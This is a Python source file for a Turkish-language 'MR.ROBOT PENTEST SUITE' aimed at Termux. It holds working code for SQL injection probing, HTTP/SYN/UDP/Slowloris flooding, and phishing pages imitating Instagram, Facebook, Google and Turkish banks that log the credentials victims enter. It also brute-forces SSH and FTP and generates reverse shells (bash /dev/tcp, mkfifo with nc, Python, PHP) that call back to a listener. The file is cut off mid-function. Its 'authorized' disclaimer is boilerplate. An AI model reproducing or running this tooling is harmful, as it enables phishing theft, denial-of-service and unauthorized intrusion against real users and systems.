#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MR.ROBOT PENTEST SUITE v3.0
Termux için Tam GUI + Panel + DDoS + SQLi + Phishing + OSINT + Exploit

I have permission and am authorized to perform this pentest.
Tengo permiso y estoy autorizado para realizar esta prueba de penetración.
"""

import os
import sys
import socket
import threading
import time
import random
import subprocess
import json
import urllib.request
import urllib.parse
import base64
import hashlib
from datetime import datetime

# ========== RENKLER ==========
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'
BOLD = '\033[1m'

# ========== MR.ROBOT LOGOSU ==========
LOGO = f"""
{R}{BOLD}
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║      ███╗   ███╗██████╗ ██████╗  ██████╗        ║
    ║      ████╗ ████║██╔══██╗██╔══██╗██╔═══╝        ║
    ║      ██╔████╔██║██████╔╝██████╔╝██████╗        ║
    ║      ██║╚██╔╝██║██╔══██╗██╔══██╗╚═══██╗        ║
    ║      ██║ ╚═╝ ██║██║  ██║██████╔╝██████║        ║
    ║      ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝        ║
    ║                                                  ║
    ║          {W}PENTEST SUITE v3.0{N}{R}                    ║
    ║     {Y}Authorized Security Testing Only{N}{R}           ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
{N}"""

# ========== YARDIMCI FONKSİYONLAR ==========
def cls():
    """Ekranı temizle"""
    os.system('clear' if os.name == 'posix' else 'cls')

def bekle(mesaj="Devam etmek için Enter..."):
    """Bekleme fonksiyonu"""
    input(f"\n{Y}{mesaj}{N}")

def baslik_yaz(baslik):
    """Başlık yazdır"""
    print(f"\n{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║     {baslik:^36}║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")

def menu_goster():
    """Ana menüyü göster"""
    cls()
    print(LOGO)
    print(f"{W}{BOLD}  ╔══════════════════════════════════════════════════╗{N}")
    print(f"{W}{BOLD}  ║     [1]{N}{G} WEB TARAMA + SQL INJECTION              {W}║{N}")
    print(f"{W}{BOLD}  ║     [2]{N}{G} DDoS STRES TESTİ (HTTP/TCP/UDP)         {W}║{N}")
    print(f"{W}{BOLD}  ║     [3]{N}{G} PHISHING PANEL KURULUMU                 {W}║{N}")
    print(f"{W}{BOLD}  ║     [4]{N}{G} BRUTE FORCE (SSH/FTP)                   {W}║{N}")
    print(f"{W}{BOLD}  ║     [5]{N}{G} OSINT BİLGİ TOPLAMA                     {W}║{N}")
    print(f"{W}{BOLD}  ║     [6]{N}{G} REVERSE SHELL OLUŞTURUCU                {W}║{N}")
    print(f"{W}{BOLD}  ║     [7]{N}{G} EXPLOIT MODÜLÜ                          {W}║{N}")
    print(f"{W}{BOLD}  ║     [8]{N}{G} WEB GUI PANEL BAŞLAT                    {W}║{N}")
    print(f"{W}{BOLD}  ║     [9]{N}{G} TÜM ARAÇLARI OTOMATİK KUR               {W}║{N}")
    print(f"{W}{BOLD}  ║     [0]{N}{R} ÇIKIŞ                                   {W}║{N}")
    print(f"{W}{BOLD}  ╚══════════════════════════════════════════════════╝{N}")
    print(f"{C}{BOLD}  ════════════════════════════════════════════════════{N}")
    print(f"{Y}  I have permission and am authorized{N}")
    print(f"{Y}  Tengo permiso y estoy autorizado{N}")
    print(f"{C}{BOLD}  ════════════════════════════════════════════════════{N}\n")


# ======================== ARAÇ 1: WEB TARAMA + SQLi ========================

def web_sqli():
    """Web tarama ve SQL injection testi"""
    baslik_yaz("WEB TARAMA + SQL INJECTION")
    
    target = input(f"{Y}[?] Hedef URL (https://site.com): {N}")
    if not target:
        print(f"{R}[!] Hedef girilmedi!{N}")
        bekle()
        return
    if not target.startswith('http'):
        target = 'https://' + target
    
    print(f"\n{G}[+] Web taraması başlatılıyor: {target}{N}")
    
    # --- ADMIN PANEL BULMA ---
    print(f"\n{Y}[*] Admin panelleri taranıyor...{N}")
    paneller = [
        'admin', 'login', 'panel', 'yonetici', 'yonetim', 'adminpanel',
        'dashboard', 'giris', 'yönetim', 'administrator', 'yonlendir',
        'cpanel', 'backdoor', 'shell', 'wp-admin', 'adminstrator',
        'administr8or', 'paneladmin', 'yonetimpaneli', 'sifre', 'giriss'
    ]
    
    bulunanlar = []
    for panel in paneller:
        try:
            url = f"{target}/{panel}/"
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
            })
            response = urllib.request.urlopen(req, timeout=3)
            if response.getcode() != 404:
                print(f"{R}  [BULUNDU] {N}{url} -> HTTP {response.getcode()}")
                bulunanlar.append(url)
        except urllib.error.HTTPError as e:
            if e.code != 404:
                print(f"{Y}  [{e.code}] {N}{url}")
        except:
            pass
    
    if not bulunanlar:
        print(f"{Y}  [-] Admin panel bulunamadı.{N}")
    
    # --- DİZİN TARAMA ---
    print(f"\n{Y}[*] Hassas dizinler taranıyor...{N}")
    dizinler = [
        '.git/', '.env', 'backup/', 'sql/', 'config/', 'vendor/',
        'wp-content/', 'includes/', 'uploads/', 'database/', 'db/',
        'phpmyadmin/', 'mysql/', 'adminer.php', 'info.php', 'test/'
    ]
    
    for dizin in dizinler:
        try:
            url = f"{target}/{dizin}"
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0'
            })
            response = urllib.request.urlopen(req, timeout=3)
            if response.getcode() != 404:
                print(f"{R}  [BULUNDU] {N}{url} -> HTTP {response.getcode()}")
        except:
            pass
    
    # --- SQL INJECTION TEST ---
    print(f"\n{Y}[*] SQL Injection testi yapılıyor...{N}")
    
    payloads = [
        "'", "''", "' OR 1=1--", "' OR '1'='1",
        "' UNION SELECT 1,2,3,4,5--", "'; DROP TABLE users--",
        "1' AND 1=1--", "1' AND 1=2--",
        "' OR '1'='1' --", "\" OR 1=1--",
        "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "' AND SLEEP(5)--", "1' AND SLEEP(5)--"
    ]
    
    sqli_bulundu = False
    for payload in payloads:
        try:
            # Farklı parametrelerde dene
            test_urls = [
                f"{target}?id={urllib.parse.quote(payload)}",
                f"{target}?page={urllib.parse.quote(payload)}",
                f"{target}?q={urllib.parse.quote(payload)}",
                f"{target}?s={urllib.parse.quote(payload)}",
                f"{target}?search={urllib.parse.quote(payload)}",
                f"{target}/{urllib.parse.quote(payload)}"
            ]
            
            for test_url in test_urls:
                req = urllib.request.Request(test_url, headers={
                    'User-Agent': 'Mozilla/5.0'
                })
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                hatalar = [
                    'sql', 'mysql', 'syntax error', 'ora-', 'you have an error',
                    'supplied argument', 'unclosed quotation', 'warning: mysql',
                    'odbc', 'microsoft ole db', 'microsoft jet', 'mysql_fetch',
                    'pg_', 'sqlite', 'driver', 'db2', 'oracle', 'mariadb'
                ]
                
                for hata in hatalar:
                    if hata in content:
                        print(f"{R}  [SQLi ZAFİYETİ]{N} SQL Injection bulundu!")
                        print(f"  {G}  Payload: {N}{payload}")
                        print(f"  {G}  URL: {N}{test_url}")
                        sqli_bulundu = True
                        break
                if sqli_bulundu:
                    break
            if sqli_bulundu:
                break
        except:
            pass
    
    # --- TIME-BASED SQLi ---
    if not sqli_bulundu:
        print(f"\n{Y}[*] Time-based SQLi testi...{N}")
        try:
            basla = time.time()
            req = urllib.request.Request(
                f"{target}?id=1' AND SLEEP(3)--",
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            urllib.request.urlopen(req, timeout=8)
            gecen = time.time() - basla
            if gecen > 2.5:
                print(f"{R}  [SQLi ZAFİYETİ]{N} Time-based SQL Injection!")
                print(f"  {G}  Gecikme: {N}{gecen:.2f} saniye")
                sqli_bulundu = True
        except:
            pass
    
    if not sqli_bulundu:
        print(f"{Y}  [-] SQL Injection zafiyeti tespit edilemedi.{N}")
    
    print(f"\n{G}[+] Web taraması tamamlandı!{N}")
    bekle()


# ======================== ARAÇ 2: DDoS STRES TESTİ ========================

def ddos_test():
    """DDoS stres testi modülü"""
    baslik_yaz("DDoS STRES TESTİ")
    
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║  SALDIRI TİPİ:                      ║")
    print(f"  ║  [1] HTTP Flood                     ║")
    print(f"  ║  [2] TCP SYN Flood                  ║")
    print(f"  ║  [3] UDP Flood                      ║")
    print(f"  ║  [4] Slowloris                      ║")
    print(f"  ║  [5] Tümü (çoklu saldırı)           ║")
    print(f"  ╚══════════════════════════════════════╝{N}")
    
    secim = input(f"\n{Y}[?] Seçim [1-5]: {N}")
    hedef = input(f"{Y}[?] Hedef IP/URL: {N}")
    port = int(input(f"{Y}[?] Port (varsayılan 80): {N}") or 80)
    sure = int(input(f"{Y}[?] Süre (saniye): {N}"))
    thread_sayisi = int(input(f"{Y}[?] Thread sayısı (varsayılan 500): {N}") or 500)
    
    if not hedef:
        print(f"{R}[!] Hedef girilmedi!{N}")
        bekle()
        return
    
    # Thread fonksiyonları
    def http_flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((hedef, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {hedef}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".encode())
                s.close()
            except:
                pass
    
    def syn_flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((hedef, port))
                s.close()
            except:
                pass
    
    def udp_flood():
        data = random._urandom(65507)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (hedef, port))
                s.close()
            except:
                pass
    
    def slowloris():
        sockets = []
        for _ in range(400):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((hedef, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {hedef}\r\n".encode())
                sockets.append(s)
            except:
                break
        
        bitis = time.time() + sure
        while time.time() < bitis:
            for s in sockets[:]:
                try:
                    s.send(f"X-{random.randint(1,5000)}: {random.randint(1,5000)}\r\n".encode())
                except:
                    sockets.remove(s)
            time.sleep(10)
    
    # Saldırıyı başlat
    flood_funcs = {'1': http_flood, '2': syn_flood, '3': udp_flood, '4': slowloris}
    
    print(f"\n{G}[+] {hedef}:{port} hedefine saldırı başlatılıyor...{N}")
    print(f"{G}[+] Süre: {sure} saniye | Thread: {thread_sayisi}{N}")
    
    if secim == '5':
        # Tüm saldırı tipleri
        for func in [http_flood, syn_flood, udp_flood, slowloris]:
            for _ in range(thread_sayisi // 4):
                t = threading.Thread(target=func, daemon=True)
                t.start()
    else:
        func = flood_funcs.get(secim, http_flood)
        for _ in range(thread_sayisi):
            t = threading.Thread(target=func, daemon=True)
            t.start()
    
    # Geri sayım
    try:
        for i in range(sure, 0, -1):
            print(f"\r{Y}[*] Kalan süre: {i:4d} sn | Aktif thread: {threading.active_count():5d} | Paket gönderiliyor...{N}", end='')
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Saldırı durduruldu!{N}")
        return
    
    print(f"\n\n{G}[√] Test tamamlandı! Toplam {sure} saniye çalıştı.{N}")
    bekle()


# ======================== ARAÇ 3: PHISHING PANEL ========================

def phishing_panel():
    """Phishing paneli oluşturma"""
    baslik_yaz("PHISHING PANEL KURULUMU")
    
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║  ŞABLON SEÇİNİ:                    ║")
    print(f"  ║  [1] Instagram                      ║")
    print(f"  ║  [2] Facebook                       ║")
    print(f"  ║  [3] Twitter/X                      ║")
    print(f"  ║  [4] Google                         ║")
    print(f"  ║  [5] Türk Bankası (Garanti/İş/Ziraat) ║")
    print(f"  ║  [6] Özel Tasarım (kendin yap)      ║")
    print(f"  ╚══════════════════════════════════════╝{N}")
    
    secim = input(f"\n{Y}[?] Seçim [1-6]: {N}")
    port = input(f"{Y}[?] Port (varsayılan 8080): {N}") or "8080"
    
    # Şablon bilgileri
    templates = {
        '1': ('Instagram', '#E1306C', 'instagram'),
        '2': ('Facebook', '#1877F2', 'facebook'),
        '3': ('Twitter', '#000000', 'twitter'),
        '4': ('Google', '#4285F4', 'google'),
        '5': ('Türk Bankası', '#003366', 'bank'),
        '6': ('Özel Site', '#333333', 'custom')
    }
    
    site_adi, renk, klas = templates.get(secim, ('Özel Site', '#333333', 'custom'))
    
    if secim == '6':
        site_adi = input(f"{Y}[?] Site adı: {N}")
        renk = input(f"{Y}[?] Renk kodu (örn: #ff0000): {N}") or '#333333'
    
    # Klasör oluştur
    klasor = "phishing_sites"
    os.makedirs(klasor, exist_ok=True)
    
    # HTML sayfası
    html_content = f"""<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{site_adi} - Güvenli Giriş</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:linear-gradient(135deg,{renk}11,{renk}44,#0a0a0f);
min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.card{{background:#fff;border-radius:20px;padding:40px 32px;width:100%;max-width:400px;
box-shadow:0 20px 60px rgba(0,0,0,0.15);text-align:center;position:relative}}
.logo{{font-size:32px;font-weight:800;color:{renk};margin-bottom:8px;letter-spacing:-0.5px}}
.subtitle{{font-size:14px;color:#888;margin-bottom:30px}}
input{{width:100%;padding:14px 16px;margin:8px 0;border:2px solid #e8e8e8;
border-radius:12px;font-size:15px;transition:all .3s;background:#fafafa}}
input:focus{{border-color:{renk};outline:none;background:#fff;box-shadow:0 0 0 4px {renk}22}}
button{{width:100%;padding:14px;background:{renk};color:#fff;border:none;
border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px;
transition:all .3s;box-shadow:0 4px 15px {renk}44}}
button:hover{{transform:translateY(-2px);box-shadow:0 8px 25px {renk}66}}
button:active{{transform:translateY(0)}}
.footer{{margin-top:24px;font-size:13px;color:#aaa;border-top:1px solid #eee;padding-top:16px}}
.footer a{{color:{renk};text-decoration:none}}
.secure-badge{{display:inline-flex;align-items:center;gap:6px;background:#e8f5e9;color:#2e7d32;
padding:6px 14px;border-radius:20px;font-size:12px;margin-bottom:20px}}
.error{{background:#ffebee;color:#c62828;padding:12px;border-radius:8px;margin-bottom:16px;font-size:14px;display:none}}
</style>
</head>
<body>
<div class="card">
<div class="secure-badge">🔒 Güvenli Bağlantı</div>
<div class="logo">{site_adi}</div>
<div class="subtitle">Hesabınıza giriş yapın</div>
<div class="error" id="error">Lütfen tüm alanları doldurun</div>
<form action="login.php" method="POST" id="loginForm">
<input type="text" name="username" placeholder="E-posta veya Kullanıcı Adı" required autocomplete="off">
<input type="password" name="password" placeholder="Şifre" required>
<button type="submit">Giriş Yap</button>
</form>
<div class="footer">
<a href="#">Şifrenizi mi unuttunuz?</a> &bull; <a href="#">Kayıt Ol</a>
</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit',function(e){{
var u=this.querySelector('input[name=username]').value.trim();
var p=this.querySelector('input[name=password]').value;
if(!u||!p){{e.preventDefault();
document.getElementById('error').style.display='block';
document.getElementById('error').textContent='Lütfen tüm alanları doldurun'}}
else{{this.querySelector('button').textContent='Giriş yapılıyor...';
this.querySelector('button').disabled=true}}
}});
</script>
</body>
</html>"""
    
    with open(f"{klasor}/index.html", "w", encoding='utf-8') as f:
        f.write(html_content)
    
    # PHP login işleyici
    php_content = """<?php
session_start();
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Bilinmiyor';
$tarih = date('Y-m-d H:i:s');

$log = "[KAYIT] Tarih: $tarih\\n";
$log .= "Kullanici: $username\\n";
$log .= "Sifre: $password\\n";
$log .= "IP: $ip\\n";
$log .= "Tarayici: $user_agent\\n";
$log .= str_repeat('-', 50)."\\n";

file_put_contents("logs.txt", $log, FILE_APPEND);

// Hedefe yönlendir
header("Location: https://www.google.com");
exit;
?>"""
    
    with open(f"{klasor}/login.php", "w") as f:
        f.write(php_content)
    
    # Log görüntüleyici
    log_viewer = """<?php
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html>
<head>
<title>PHISHING LOG MONITOR</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0a0f;color:#00ff41;padding:30px}
h1{color:#e94560;font-size:24px;margin-bottom:20px;border-bottom:1px solid #00ff4144;padding-bottom:10px}
pre{background:#0d0d1a;padding:20px;border-radius:8px;border:1px solid #00ff4144;
min-height:300px;white-space:pre-wrap;word-wrap:break-word;font-size:13px;line-height:1.6}
.info{color:#888;font-size:12px;margin-top:10px}
.refresh{color:#00ff41;text-decoration:none;margin-left:10px}
</style>
</head>
<body>
<h1>🔴 PHISHING LOG KAYITLARI <a href='' class='refresh'>⟳ Yenile</a></h1>
<pre>
<?php
if(file_exists("logs.txt")){
    $logs = file_get_contents("logs.txt");
    echo $logs ? htmlspecialchars($logs) : "[!] Henuz kayit yok.";
} else {
    echo "[!] Log dosyasi bulunamadi.";
}
?>
</pre>
<div class="info">Canli log monitoru - Sayfayi yenileyerek guncel kayitlari goruntuleyin</div>
</body>
</html>"""
    
    with open(f"{klasor}/logs.php", "w") as f:
        f.write(log_viewer)
    
    # Son dokunuşlar
    for f_ismi in ['login.php', 'logs.php']:
        os.chmod(f"{klasor}/{f_ismi}", 0o755)
    
    print(f"\n{G}[√] Phishing paneli oluşturuldu!{N}")
    print(f"{G}    Klasör: {klasor}/{N}")
    print(f"\n{Y}[*] Başlatmak için:{N}")
    print(f"{G}    cd {klasor} && php -S 0.0.0.0:{port}{N}")
    print(f"{Y}[*] Panel URL: http://localhost:{port}{N}")
    print(f"{Y}[*] Log URL:   http://localhost:{port}/logs.php{N}")
    
    baslat = input(f"\n{Y}[?] Panel şimdi başlatılsın mı? (e/h): {N}")
    if baslat.lower() == 'e':
        print(f"{G}[+] Panel başlatılıyor...{N}")
        subprocess.Popen(
            f"cd {klasor} && php -S 0.0.0.0:{port} > /dev/null 2>&1",
            shell=True
        )
        time.sleep(1)
        print(f"{G}[√] Panel aktif! http://localhost:{port}{N}")
        print(f"{G}[√] Loglar: http://localhost:{port}/logs.php{N}")
    
    bekle()


# ======================== ARAÇ 4: BRUTE FORCE ========================

def brute_force():
    """Brute force modülü"""
    baslik_yaz("BRUTE FORCE MODÜLÜ")
    
    hedef = input(f"{Y}[?] Hedef IP: {N}")
    if not hedef:
        print(f"{R}[!] Hedef girilmedi!{N}")
        bekle()
        return
    
    print(f"\n{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║  SERVİS SEÇİNİ:                   ║")
    print(f"  ║  [1] SSH (port 22)                 ║")
    print(f"  ║  [2] FTP (port 21)                 ║")
    print(f"  ║  [3] HTTP Basic Auth               ║")
    print(f"  ╚══════════════════════════════════════╝{N}")
    
    servis = input(f"\n{Y}[?] Seçim [1-3]: {N}")
    port = {'1': 22, '2': 21, '3': 80}.get(servis, 22)
    
    # Kullanıcı adları
    users = [
        'admin', 'root', 'user', 'test', 'administrator', 'oracle',
        'postgres', 'manager', 'backup', 'info', 'support', 'webmaster',
        'demo', 'guest', 'user1', 'admin1', 'sysadmin', 'operator',
        'ftp', 'ftpuser', 'ssh', 'admin123', 'server', 'hosting'
    ]
    
    # Şifreler
    passwords = [
        '123456', 'admin', 'password', '1234', 'root', 'test',
        'admin123', 'letmein', 'passw0rd', '12345', 'admin1234',
        'password123', '123456789', 'qwerty', 'abc123', '111111',
        '123', '12345678', 'sunshine', 'iloveyou', 'princess',
        'football', 'welcome', 'shadow', 'michael', 'dragon',
        'master', 'login', 'pass', '000000', '654321', 'superman',
        'batman', 'trustno1', 'hunter', 'ranger', 'starwars',
        '1q2w3e4r', 'zaq12wsx', 'qwerty123', 'password1',
        'welcome123', 'admin2024', 'Passw0rd', 'P@ssw0rd'
    ]
    
    print(f"\n{G}[+] {len(users)} kullanıcı × {len(passwords)} şifre deneniyor...{N}")
    print(f"{G}[+] Toplam kombinasyon: {len(users) * len(passwords)}{N}")
    print(f"{G}[+] Hedef: {hedef}:{port} / Servis: {['SSH','FTP','HTTP'][int(servis)-1]}{N}\n")
    
    # Brute force fonksiyonları
    def ssh_brute(usr, pwd):
        try:
            sonuc = subprocess.run(
                ['sshpass', '-p', pwd, 'ssh', '-o', 'StrictHostKeyChecking=no',
                 '-o', 'ConnectTimeout=3', '-o', 'BatchMode=yes',
                 f'{usr}@{hedef}', 'exit'],
                capture_output=True, timeout=5
            )
            return sonuc.returncode == 0
        except:
            return False
    
    def ftp_brute(usr, pwd):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((hedef, 21))
            banner = s.recv(1024)
            s.send(f'USER {usr}\r\n'.encode())
            response = s.recv(1024)
            s.send(f'PASS {pwd}\r\n'.encode())
            response = s.recv(1024).decode()
            s.close()
            return '230' in response
        except:
            return False
    
    def http_brute(usr, pwd):
        try:
            yetki = base64.b64encode(f'{usr}:{pwd}'.encode()).decode()
            req = urllib.request.Request(
                f'http://{hedef}/',
                headers={'Authorization': f'Basic {yetki}'}
            )
            urllib.request.urlopen(req, timeout=3)
            return True
        except urllib.error.HTTPError as e:
            return e.code != 401
        except:
            return False
    
    bulundu = [None]
    calisiyor = [True]
    
    def brute_worker(usr_list, pwd_list, thread_id):
        for usr in usr_list:
            if not calisiyor[0]:
                return
            for pwd in pwd_list:
                if not calisiyor[0]:
                    return
                
                if servis == '1':
                    if ssh_brute(usr, pwd):
                        bulundu[0] = (usr, pwd)
                        calisiyor[0] = False
                        return
                elif servis == '2':
                    if ftp_brute(usr, pwd):
                        bulundu[0] = (usr, pwd)
                        calisiyor[0] = False
                        return
                elif servis == '3':
                    if http_brute(usr, pwd):
                        bulundu[0] = (usr, pwd)
                        calisiyor[0] = False
                        return
    
    # Thread'leri başlat
    threads = []
    n_threads = 10
    chunk_size = len(users) // n_threads + 1
    
    for i in range(n_threads):
        usr_chunk = users[i*chunk_size:(i+1)*chunk_size]
        if usr_chunk:
            t = threading.Thread(target=brute_worker, args=(usr_chunk, passwords, i))
            t.daemon = True
            t.start()
            threads.append(t)
    
    # Bekle ve sonucu kontrol et
    try:
        for i in range(60):  # 60 saniye max
            if not calisiyor[0]:
                break
            if not any(t.is_alive() for t in threads):
                break
            time.sleep(1)
    except KeyboardInterrupt:
        calisiyor[0] = False
    
    if bulundu[0]:
        print(f"\n{R}{BOLD}[KIRILDI]{N}{G} Kullanıcı: {bulundu[0][0]} | Şifre: {bulundu[0][1]}{N}")
        print(f"{G}[√] {hedef}:{port} servisine erişim sağlandı!{N}")
    else:
        print(f"\n{Y}[-] Bu kombinasyonlarla kırılamadı.{N}")
        print(f"{Y}[*] Daha kapsamlı bir kelime listesi ile tekrar deneyin.{N}")
    
    bekle()


# ======================== ARAÇ 5: OSINT ========================

def osint_tool():
    """OSINT bilgi toplama"""
    baslik_yaz("OSINT BİLGİ TOPLAMA")
    
    hedef = input(f"{Y}[?] Hedef domain: {N}")
    if not hedef:
        print(f"{R}[!] Hedef girilmedi!{N}")
        bekle()
        return
    
    print(f"\n{G}[+] Bilgi toplanıyor: {hedef}{N}\n")
    
    # DNS sorgusu
    print(f"{C}{BOLD}[DNS KAYITLARI]{N}")
    try:
        ip = socket.gethostbyname(hedef)
        print(f"  {G}IP Adresi:{N} {ip}")
        
        try:
            host = socket.gethostbyaddr(ip)
            print(f"  {G}Host Adı:{N} {host[0]}")
        except:
            pass
    except:
        print(f"  {Y}[-] DNS çözümlemesi başarısız{N}")
    
    # Alt alan adları
    print(f"\n{C}{BOLD}[ALT ALAN ADLARI]{N}")
    subdomains = [
        'www', 'mail', 'ftp', 'admin', 'dev', 'test', 'blog', 'api',
        'cdn', 'm', 'panel', 'vpn', 'remote', 'webmail', 'server',
        'ns1', 'ns2', 'smtp', 'pop3', 'imap', 'forum', 'shop', 'app',
        'secure', 'portal', 'ssh', 'backup', 'cloud', 'support', 'help',
        'status', 'docs', 'wiki', 'git', 'jenkins', 'jira', 'confluence',
        'nexus', 'artifactory', 'kibana', 'grafana', 'prometheus'
    ]
    
    bulunan_sub = []
    for sub in subdomains:
        try:
            sub_ip = socket.gethostbyname(f"{sub}.{hedef}")
            print(f"  {G}{sub}.{hedef}{N} -> {sub_ip}")
            bulunan_sub.append(f"{sub}.{hedef}")
        except:
            pass
    
    if not bulunan_sub:
        print(f"  {Y}[-] Alt alan adı bulunamadı{N}")
    
    # HTTP Header analizi
    print(f"\n{C}{BOLD}[HTTP HEADER ANALİZİ]{N}")
    for proto in ['https', 'http']:
        try:
            req = urllib.request.Request(
                f"{proto}://{hedef}",
                headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'}
            )
            response = urllib.request.urlopen(req, timeout=5)
            
            print(f"  {G}[{proto.upper()}]{N}")
            print(f"    Sunucu: {response.headers.get('Server', 'Bilinmiyor')}")
            print(f"    Teknoloji: {response.headers.get('X-Powered-By', 'Belirtilmemiş')}")
            print(f"    Content-Type: {response.headers.get('Content-Type')}")
            print(f"    HTTP Sürüm: HTTP/{response.version/10:.1f}")
            
            # Güvenlik başlıkları
            security_headers = {
                'X-Frame-Options': 'X-Frame-Options',
                'X-Content-Type-Options': 'X-Content-Type-Options',
                'X-XSS-Protection': 'X-XSS-Protection',
                'Content-Security-Policy': 'CSP',
                'Strict-Transport-Security': 'HSTS',
                'Referrer-Policy': 'Referrer-Policy'
            }
            
            print(f"    {Y}Güvenlik Başlıkları:{N}")
            for header, name in security_headers.items():
                val = response.headers.get(header, '')
                if val:
                    print(f"      {G}✓{N} {name}: {val[:50]}")
                else:
                    print(f"      {R}✗{N} {name} eksik")
            
            break
        except:
            continue
    
    # Basit port taraması
    print(f"\n{C}{BOLD}[AÇIK PORTLAR (HIZLI TARAMA)]{N}")
    
    port_list = [
        21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587,
        993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900,
        6379, 8080, 8443, 9000, 9090, 27017
    ]
    
    try:
        target_ip = socket.gethostbyname(hedef)
        acik_portlar = []
        
        for port in port_list:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target_ip, port)) == 0:
                    print(f"  {G}AÇIK{N}  Port {port}")
                    acik_portlar.append(port)
                s.close()
            except:
                pass
        
        if not acik_portlar:
            print(f"  {Y}[-] Hiçbir port açık bulunamadı (hızlı tarama){N}")
    except:
        print(f"  {Y}[-] Port taraması yapılamadı{N}")
    
    # Whois benzeri bilgi
    print(f"\n{C}{BOLD}[DOMAIN BİLGİSİ]{N}")
    try:
        print(f"  {G}Domain:{N} {hedef}")
        print(f"  {G}IP:{N} {socket.gethostbyname(hedef)}")
        print(f"  {G}TTL:{N} Sonuçlar yukarıda")
    except:
        pass
    
    print(f"\n{G}[√] OSINT bilgi toplama tamamlandı!{N}")
    print(f"{Y}[*] Bulunan: {len(bulunan_sub)} alt domain, {len(acik_portlar) if 'acik_portlar' in dir() else 0} açık port{N}")
    bekle()


# ======================== ARAÇ 6: REVERSE SHELL ========================

def reverse_shell():
    """Reverse shell oluşturucu"""
    baslik_yaz("REVERSE SHELL OLUŞTURUCU")
    
    ip = input(f"{Y}[?] Dinleyici IP: {N}")
    port = input(f"{Y}[?] Dinleyici Port: {N}")
    
    if not ip or not port:
        print(f"{R}[!] IP ve port gerekli!{N}")
        bekle()
        return
    
    print(f"\n{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║  SHELL TİPİ:                      ║")
    print(f"  ║  [1] Python Reverse Shell          ║")
    print(f"  ║  [2] PHP Reverse Shell             ║")
    print(f"  ║  [3] Bash Reverse Shell            ║")
    print(f"  ║  [4] Netcat Reverse Shell          ║")
    print(f"  ║  [5] Perl Reverse Shell            ║")
    print(f"  ║  [6] TÜMÜ (payload çeşitlendirme)  ║")
    print(f"  ╚══════════════════════════════════════╝{N}")
    
    secim = input(f"\n{Y}[?] Seçim [1-6]: {N}")
    
    shells = {}
    
    if secim in ['1', '6']:
        shells['Python'] = f"""python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
'"""
        
        shells['Python Kısa'] = f'python3 -c "import os,socket,subprocess;s=socket.socket();s.connect((\\"{ip}\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));subprocess.call([\\"/bin/sh\\",\\"-i\\"])"'
    
    if secim in ['2', '6']:
        shells['PHP'] = f"""php -r '
$sock=fsockopen("{ip}",{port});
exec("/bin/bash -i <&3 >&3 2>&3");
'"""
        
        shells['PHP Exec'] = f'php -r "system(\\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\\");"'
    
    if secim in ['3', '6']:
        shells['Bash'] = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
        shells['Bash (mkfifo)'] = f'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f'
    
    if secim in ['4', '6']:
